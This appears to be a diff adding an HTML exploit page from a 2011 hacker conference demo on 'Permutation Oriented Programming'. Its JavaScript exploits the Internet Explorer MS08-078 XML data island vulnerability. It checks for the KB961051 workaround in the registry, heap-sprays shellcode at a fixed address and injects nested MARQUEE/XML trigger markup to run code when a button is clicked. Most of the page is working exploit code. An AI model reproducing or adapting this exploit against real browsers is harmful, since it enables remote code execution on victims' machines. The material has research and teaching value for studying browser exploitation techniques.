@@ -1,0 +1,139 @@
+<!--
+   Talk:        Inception - The extended edition
+   Author:      Nelson Brito <nbrito *NoSPAM* sekure.org>
+   Conference:  Hackers to Hackers Conference Eighth Edition (October 2011)
+ --------------------------------------------------------------------------
+           .___                            __  .__
+           |   | ____   ____  ____ _______/  |_|__| ____   ____
+           |   |/    \_/ ___\/ __ \\____ \   __\  |/  _ \ /    \
+           |   |   |  \  \__\  ___/|  |_> >  | |  (  <_> )   |  \
+           |___|___|__/\_____>_____>   __/|__| |__|\____/|___|__/
+                                   |__|
+                       _______________  ____ ____
+                       \_____  \   _  \/_   /_   |
+                        /  ____/  /_\  \|   ||   |
+                       /       \  \_/   \   ||   |
+                       \________\_______/___||___|
+ 
+ --------------------------------------------------------------------------
+ Copyright (c) 2011 Nelson Brito. All rights reserved worldwide.
+ 
+ This program is free software: you can redistribute it and/or modify it
+ under  the terms of the GNU General Public License  as published by the
+ Free Software Foundation,  either version 3 of the License, or (at your
+ option) any later version.
+ 
+ This program  is  distributed in  the hope that  it will be useful, but
+ WITHOUT  ANY  WARRANTY;   without   even  the   implied   warranty   of
+ MERCHANTABILITY  or  FITNESS  FOR  A  PARTICULAR  PURPOSE.  See the GNU
+ General Public License for more details.
+ 
+ You  should have  received a copy of the  GNU  General  Public  License
+ along with this program.  If not, see <http://www.gnu.org/licenses/>.
+-->
+<HTML>
+<LINK REL="stylesheet" HREF="./samples.css" TYPE="text/css">
+<STYLE>
+a:hover{
+	color:red;
+}
+</STYLE>
+<HEAD>
+	<TITLE> Permutation Oriented Programming </TITLE>
+	<LINK REL="icon"                      TYPE="image/ico" HREF="favicon.ico"/>
+	<META HTTP-EQUIV="content-type"       CONTENT="text/html; charset=UTF-8"/>
+	<META HTTP-EQUIV="content-style-type" CONTENT="text/css"/>
+	<META NAME="author"                   CONTENT="Nelson Brito"/>
+	<META NAME="copyright"                CONTENT="2004-2011 Nelson Brito"/>
+	<META NAME="description"              CONTENT="Permutation Oriented Programming"/>
+	<META NAME="keywords"                 CONTENT="Permutation Oriented Programming"/>
+</HEAD>
+<SCRIPT SRC="../../ExploitLib.js" TYPE="text/javascript" LANGUAGE="JavaScript"></SCRIPT>
+<SCRIPT TYPE="text/javascript" LANGUAGE="JavaScript">
+ function Inception (){
+	var ms08_078  = new Exploit(),
+	    choice    = new Number(),
+	    memory    = new Number(),
+		address   = new Number(),
+		shellcode = new String(),
+		trigger   = new String();
+	var classid   = new Array(
+			"550DDA30-0541-11D2-9CA9-0060B0EC3D39",	/* XML Data Source Object 1.0 */
+			"F5078F39-C551-11D3-89B9-0000F81FE221", /* XML Data Source Object 3.0 */
+			"F6D90F14-9C73-11D3-B32E-00C04F990BB4"  /* XML Data Source Object 3.0 */
+		),
+		automation = new Boolean(false), wshell, hkey = "HKCR\\CLSID\\{379E501F-B231-11D1-ADC1-00805FC752D8}\\";
+
+	ms08_078.detail = ["MS08-078", "0.01", "20111015", "Nelson Brito"];
+	ms08_078.offset = [ 0x0a0a0a0a ];
+	ms08_078.message = false;
+
+	choice    = ms08_078.random(ms08_078.offset.length);
+	memory    = ms08_078.memory(ms08_078.offset[choice], 16);
+	address   = ms08_078.address(ms08_078.offset[choice], 0);
+	shellcode = ms08_078.shellcode(ms08_078.code[2], 1);
+
+	try{
+		wshell = new ActiveXObject("WScript.Shell");
+		automation = true;
+	}catch(error){
+		document.getElementById("message").innerHTML = "AUTOMATION FAILED";
+		automation = false;
+	}
+
+	if(automation){
+		try{
+			wshell.RegRead(hkey);
+			document.getElementById("message").innerHTML = "NOT APPLIED";
+		}catch(error){
+			document.getElementById("message").innerHTML = "APPLIED";
+			automation = false;
+		}
+	}
+
+	if(automation){
+		trigger = trigger.concat("<XML ID=I><X><C>");
+		trigger = trigger.concat("<![CDATA[<IMG SRC=\"javascript:" + ms08_078.address(ms08_078.offset[choice], 2) + "ert((\'XSS\')\">]]>");
+		trigger = trigger.concat("</C></X></XML>");
+	}else{
+		trigger = trigger.concat("<OBJECT CLASSID=\"clsid:" + classid[ms08_078.random(classid.length)] + "\" ID=I><X><C>");
+		trigger = trigger.concat("<![CDATA[<IMG SRC=\"javascript:" + ms08_078.address(ms08_078.offset[choice], 2) + "ert((\'XSS\')\">]]>");
+		trigger = trigger.concat("</C></X></OBJECT>");
+	}
+
+	trigger = trigger.concat("<MARQUEE DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>");
+	trigger = trigger.concat("<MARQUEE DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>");
+	trigger = trigger.concat("</MARQUEE></MARQUEE>");
+
+	if(ms08_078.spray(address, shellcode, memory))
+		document.getElementById("b00m").innerHTML = trigger;
+}
+</SCRIPT>
+<BODY>
+<DIV CLASS="body">
+	<H1>Hackers to Hackers Conference 8<SUP>th</SUP> Edition -- Inception Demonstration</H1>
+		<TABLE>
+			<THEAD>
+				<TR>
+					<TH COLSPAN=2>&quot;Disable XML Island functionality&quot; (KB961051)</TH>
+				</TR>
+			</THEAD>
+			<TBODY>
+				<TR>
+					<TD>Workaround:</TD>
+					<TD><DIV CLASS="inception" ID="message"></DIV></TD>
+				</TR>
+				<TR>
+					<TD COLSPAN=2><INPUT TYPE=BUTTON VALUE="INCEPTION" onClick="Inception();"></TD>
+				</TR>
+			</TBODY>
+		</TABLE>
+		
+		<DIV ID="b00m" STYLE="display: none;"></DIV>
+	<P CLASS="viewsource">[Click on &quot;INCEPTION&quot; to automate the MS08-078 vulnerability exploitation]</P>
+	<A CLASS="copyright" HREF="http://code.google.com/p/permutation-oriented-programming/">Permutation Oriented Programming</A>
+	<BR/>
+	<A CLASS="copyright" HREF="http://about.me/nbrito">&copy;2004-2011 Nelson Brito. All rights reserved worldwide.</A>
+</DIV>
+</BODY>
+</HTML>
